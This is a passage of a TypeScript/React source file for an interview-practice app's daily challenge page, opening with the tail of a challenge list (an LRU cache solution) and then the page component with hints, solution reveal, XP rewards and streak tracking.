  constructor(public key: number, public val: number,
              public prev: Node|null = null, public next: Node|null = null) {}
}

class LRUCache {
  private map = new Map<number, Node>();
  // Sentinel head/tail to avoid null checks
  private head = new Node(0, 0); // least recently used end
  private tail = new Node(0, 0); // most recently used end

  constructor(private capacity: number) {
    this.head.next = this.tail;
    this.tail.prev = this.head;
  }

  get(key: number): number {
    const node = this.map.get(key);
    if (!node) return -1;
    this.remove(node);
    this.insertFront(node); // mark as recently used
    return node.val;
  }

  put(key: number, value: number): void {
    const existing = this.map.get(key);
    if (existing) { existing.val = value; this.remove(existing); this.insertFront(existing); return; }
    if (this.map.size >= this.capacity) {
      const lru = this.head.next!; // least recently used
      this.remove(lru);
      this.map.delete(lru.key);
    }
    const node = new Node(key, value);
    this.map.set(key, node);
    this.insertFront(node);
  }

  private remove(node: Node) {
    node.prev!.next = node.next;
    node.next!.prev = node.prev;
  }

  private insertFront(node: Node) {
    node.prev = this.tail.prev;
    node.next = this.tail;
    this.tail.prev!.next = node;
    this.tail.prev = node;
  }
}
// Both get() and put(): O(1) | Space: O(capacity)`,
    tags: ['Linked List', 'Hashing', 'Design'], xpReward: 100,
    discussionPoints: ['Why doubly linked list instead of singly linked?', 'What do the sentinel head/tail nodes simplify?', 'How to implement LFU cache? (Much harder)'],
  },
];

// Fill up to 31 entries with cycling challenges
while (CHALLENGES.length < 31) {
  CHALLENGES.push(CHALLENGES[CHALLENGES.length % 20]);
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

const TYPE_META: Record<ChallengeType, { label: string; icon: string; color: string; bg: string }> = {
  dsa:             { label: 'DSA',           icon: 'code',             color: 'text-blue-400',   bg: 'bg-blue-500/10'   },
  'system-design': { label: 'System Design', icon: 'architecture',     color: 'text-cyan-400',   bg: 'bg-cyan-500/10'   },
  behavioral:      { label: 'Behavioral',    icon: 'record_voice_over', color: 'text-orange-400', bg: 'bg-orange-500/10' },
  sql:             { label: 'SQL',           icon: 'storage',          color: 'text-purple-400', bg: 'bg-purple-500/10' },
  security:        { label: 'Security',      icon: 'shield',           color: 'text-red-400',    bg: 'bg-red-500/10'    },
  oop:             { label: 'OOP Design',    icon: 'account_tree',     color: 'text-amber-400',  bg: 'bg-amber-500/10'  },
};

const DIFF_STYLE: Record<string, string> = {
  easy:   'text-green-400 bg-green-500/10 border-green-500/20',
  medium: 'text-yellow-400 bg-yellow-500/10 border-yellow-500/20',
  hard:   'text-red-400 bg-red-500/10 border-red-500/20',
};

function todayChallenge(): DailyChallenge {
  const day = new Date().getDate() - 1; // 0-indexed
  return CHALLENGES[day % CHALLENGES.length];
}

function todayKey(): string {
  return `eyf.daily.${new Date().toISOString().split('T')[0]}`;
}

// ─── Component ────────────────────────────────────────────────────────────────

export function DailyChallengePage() {
  const { fireXP } = useUser();
  const challenge = todayChallenge();
  const meta = TYPE_META[challenge.type];
  const [showHint, setShowHint] = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [answer, setAnswer] = useState('');
  const [streak, setStreak] = useState(0);

  useEffect(() => {
    const today = todayKey();
    const done = localStorage.getItem(today);
    if (done === 'done') setSubmitted(true);
    // Count streak
    let s = 0;
    const now = new Date();
    while (true) {
      const d = new Date(now);
      d.setDate(d.getDate() - s);
      const k = `eyf.daily.${d.toISOString().split('T')[0]}`;
      if (localStorage.getItem(k) === 'done') s++;
      else break;
      if (s > 365) break;
    }
    setStreak(s);
  }, []);

  const handleSubmit = () => {
    if (!answer.trim()) return;
    localStorage.setItem(todayKey(), 'done');
    setSubmitted(true);
    setShowSolution(true);
    fireXP(challenge.xpReward, `Daily challenge: ${challenge.title}`);
  };

  const now = new Date();
  const tomorrow = new Date(now);
  tomorrow.setDate(tomorrow.getDate() + 1);
  tomorrow.setHours(0, 0, 0, 0);
  const msTilTomorrow = tomorrow.getTime() - now.getTime();
  const hoursTil = Math.floor(msTilTomorrow / 3600000);
  const minsTil = Math.floor((msTilTomorrow % 3600000) / 60000);

  return (
    <AppShell>
      <div className="pt-8 max-w-4xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8 flex-wrap gap-4">
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 bg-[#E82127]/10 rounded-xl flex items-center justify-center">
              <Icon name="today" className="text-[#E82127]" size={24} />
            </div>
            <div>
              <h1 className="text-3xl font-black tracking-tighter">Daily Challenge</h1>
              <p className="text-on-surface-variant text-sm">
                {now.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric', year: 'numeric' })}
              </p>
            </div>
          </div>
          <div className="flex items-center gap-6">
            {streak > 0 && (
              <div className="flex items-center gap-2 bg-orange-500/10 border border-orange-500/20 rounded-xl px-4 py-2">
                <Icon name="local_fire_department" size={18} className="text-orange-400" filled />
                <span className="font-black text-orange-400">{streak}</span>
                <span className="text-xs font-bold text-orange-400/70">day streak</span>
              </div>
            )}
            <div className="text-right">
              <p className="text-[10px] font-bold uppercase tracking-widest text-zinc-600">Next challenge in</p>
              <p className="font-black text-on-surface text-lg">{hoursTil}h {minsTil}m</p>
            </div>
          </div>
        </div>

        {/* Challenge card */}
        <div className="bg-surface-container rounded-2xl overflow-hidden mb-6">
          {/* Top bar */}
          <div className={`p-6 border-b border-white/5 ${meta.bg}`}>
            <div className="flex items-center justify-between flex-wrap gap-4">
              <div className="flex items-center gap-3">
                <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${meta.bg} ${meta.color}`}>
                  <Icon name={meta.icon} size={20} />
                </div>
                <div>
                  <p className={`text-[10px] font-black uppercase tracking-widest ${meta.color}`}>{meta.label}</p>
                  <h2 className="text-xl font-black text-on-surface">{challenge.title}</h2>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <span className={`px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-widest border ${DIFF_STYLE[challenge.difficulty]}`}>
                  {challenge.difficulty}
                </span>
                <div className="flex items-center gap-1 bg-surface-container rounded-full px-3 py-1.5">
                  <Icon name="bolt" size={14} className="text-[#E82127]" filled />
                  <span className="font-black text-[#E82127] text-sm">+{challenge.xpReward} XP</span>
                </div>
                {submitted && (
                  <div className="flex items-center gap-1.5 bg-green-500/10 border border-green-500/20 rounded-full px-3 py-1.5">
                    <Icon name="check_circle" size={14} className="text-green-400" filled />
                    <span className="text-[10px] font-black text-green-400 uppercase tracking-widest">Completed</span>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Prompt */}
          <div className="p-6">
            <pre className="text-sm text-on-surface/90 whitespace-pre-wrap font-sans leading-relaxed">
              {challenge.prompt}
            </pre>

            {/* Tags */}
            <div className="flex gap-2 mt-4 flex-wrap">
              {challenge.tags.map((tag) => (
                <span key={tag} className="px-2.5 py-1 bg-surface-container-high rounded-full text-[10px] font-bold text-zinc-500 uppercase tracking-widest">
                  {tag}
                </span>
              ))}
            </div>
          </div>

          {/* Answer area */}
          {!submitted && (
            <div className="px-6 pb-6">
              <label htmlFor="daily-answer" className="text-[10px] font-black uppercase tracking-widest text-zinc-600 block mb-2">Your Answer / Approach</label>
              <textarea
                id="daily-answer"
                value={answer}
                onChange={(e) => setAnswer(e.target.value)}
                placeholder="Write your solution, approach, or key insights here..."
                rows={8}
                className="w-full bg-zinc-900 border border-white/8 rounded-xl px-4 py-3 text-sm text-white font-mono placeholder:text-zinc-700 focus:outline-none focus:border-[#E82127]/40 resize-none"
              />
              <div className="flex items-center gap-3 mt-3 flex-wrap">
                <button
                  onClick={handleSubmit}
                  disabled={!answer.trim()}
                  className="bg-[#E82127] disabled:opacity-40 text-white font-black uppercase tracking-widest text-xs py-3 px-6 rounded-full hover:brightness-110 transition-all active:scale-95 flex items-center gap-2"
                >
                  <Icon name="check" size={14} />
                  Submit & Reveal Solution (+{challenge.xpReward} XP)
                </button>
                <button
                  onClick={() => setShowHint(!showHint)}
                  className="flex items-center gap-2 text-xs font-bold text-zinc-500 hover:text-zinc-300 transition-colors"
                >
                  <Icon name="lightbulb" size={14} />
                  {showHint ? 'Hide Hint' : 'Show Hint'}
                </button>
              </div>

              {showHint && (
                <div className="mt-4 p-4 bg-yellow-500/5 border border-yellow-500/20 rounded-xl">
                  <p className="text-[10px] font-black uppercase tracking-widest text-yellow-400 mb-2">Hint</p>
                  <p className="text-sm text-zinc-300">{challenge.hint}</p>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Solution (revealed after submit or explicitly) */}
        {(showSolution || submitted) && (
          <div className="bg-surface-container rounded-2xl overflow-hidden mb-6">
            <div className="flex items-center justify-between px-6 py-4 border-b border-white/5">
              <div className="flex items-center gap-2">
                <Icon name="star" size={18} className="text-yellow-400" filled />
                <h3 className="font-black text-on-surface">Model Solution</h3>
              </div>
            </div>
            <div className="p-6">
              <pre className="text-sm text-on-surface/90 bg-zinc-900 rounded-xl p-4 overflow-x-auto whitespace-pre-wrap font-mono leading-relaxed border border-white/5">
                {challenge.solution}
              </pre>
            </div>

            {/* Discussion points */}
            <div className="px-6 pb-6">
              <p className="text-[10px] font-black uppercase tracking-widest text-zinc-600 mb-3">Discussion Points</p>
              <ul className="space-y-2">
                {challenge.discussionPoints.map((point) => (
                  <li key={point} className="flex items-start gap-2 text-sm text-zinc-400">
                    <Icon name="arrow_forward" size={14} className="text-[#E82127] flex-shrink-0 mt-0.5" />
                    {point}
                  </li>
                ))}
              </ul>
            </div>
          </div>
        )}

        {/* Past challenges preview */}
        <div className="bg-surface-container rounded-2xl p-6">
          <div className="flex items-center justify-between mb-5">
            <h3 className="font-black text-on-surface">Recent Challenges</h3>
            <span className="text-[10px] text-zinc-600 font-bold uppercase tracking-widest">Last 7 days</span>
          </div>
          <div className="space-y-2">
            {Array.from({ length: 7 }, (_, i) => i + 1).map((daysAgo) => {
              const d = new Date();
              d.setDate(d.getDate() - daysAgo);
              const key = `eyf.daily.${d.toISOString().split('T')[0]}`;
              const done = localStorage.getItem(key) === 'done';
              const dayChallenge = CHALLENGES[(d.getDate() - 1) % CHALLENGES.length];
              const m = TYPE_META[dayChallenge.type];
              return (
                <div key={daysAgo} className={`flex items-center gap-4 p-3 rounded-xl ${done ? 'bg-green-500/5 border border-green-500/10' : 'bg-surface-container-high'}`}>
                  <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${m.bg}`}>
                    <Icon name={m.icon} size={16} className={m.color} />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-bold text-on-surface truncate">{dayChallenge.title}</p>
                    <p className="text-[10px] text-zinc-600">
                      {d.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' })} · {m.label}
                    </p>
                  </div>
                  {done
                    ? <Icon name="check_circle" size={18} className="text-green-400 flex-shrink-0" filled />
                    : <span className="text-[10px] font-bold text-zinc-600 flex-shrink-0">Missed</span>
                  }
                </div>
              );
            })}
          </div>
        </div>

        {/* CTA to related resources */}
        <div className="mt-6 grid grid-cols-1 sm:grid-cols-3 gap-4">
          {[
            { icon: 'code', label: 'Practice Problems', path: '/app/problems', color: 'text-blue-400', bg: 'bg-blue-500/10' },
            { icon: 'style', label: 'Flashcard Review', path: '/app/flashcards', color: 'text-purple-400', bg: 'bg-purple-500/10' },
            { icon: 'record_voice_over', label: 'Mock Interview', path: '/app/mock-interview', color: 'text-orange-400', bg: 'bg-orange-500/10' },
          ].map((item) => (
            <Link key={item.path} to={item.path}>
              <div className={`flex items-center gap-3 bg-surface-container rounded-xl p-4 hover:bg-surface-container-high transition-all ${item.bg} border border-white/4`}>
                <Icon name={item.icon} size={18} className={item.color} />
                <span className="text-sm font-bold text-on-surface">{item.label}</span>
                <Icon name="arrow_forward" size={14} className="text-zinc-600 ml-auto" />
              </div>
            </Link>
          ))}
        </div>
      </div>
    </AppShell>
  );
}
